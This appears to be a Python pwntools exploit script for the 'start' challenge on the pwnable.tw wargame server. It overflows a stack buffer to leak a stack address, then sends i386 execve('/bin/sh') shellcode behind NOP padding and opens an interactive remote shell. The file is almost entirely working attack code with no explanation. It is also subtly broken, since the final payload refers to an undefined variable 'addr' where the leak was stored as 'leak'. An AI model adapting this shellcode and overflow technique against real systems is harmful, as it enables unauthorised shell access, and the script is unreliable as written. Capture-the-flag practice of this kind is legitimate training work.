#!/usr/bin/python
from pwn import *

#set context
context(arch='i386', os='linux', endian='little')

#server
HOST = "chall.pwnable.tw"
PORT = 10000

#connect
r = remote(HOST, PORT)

#Local Debugging
#r = process('./start')
#gdb.attach(proc.pidof(r)[0], "b *0x8048087\n")

#welcome msg
print r.recvuntil(':') 

#shellcode
sc = "\x31\xd2" #xor %edx,edx //3rd arg to execve
sc += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#Get leak payload
buf = "A"*20
buf += "\x87\x80\x04\x08" #mov %ecx,%esp //leak ESP
#Execute leak
r.send(buf) #Not sendline , /n breaks this leak

leak = u32(r.recv(4)) #convert leak addr
print "LEAK: %s" % hex(leak)
r.recv() #recv rest if any

#use leaked stack ptr to exec shellcode
buf = "B"*20
buf += p32(addr+0x18) #+24 - 20 for B's 4 for leak
buf += "\x90"*8 #Pad with some NOPs
buf += sc #sc
#FINAL PAYLOAD: ("B"*20)+(leak+24)+(NOP*8)+(shellcode)

#send payload
r.send(buf)

#interact
r.interactive()

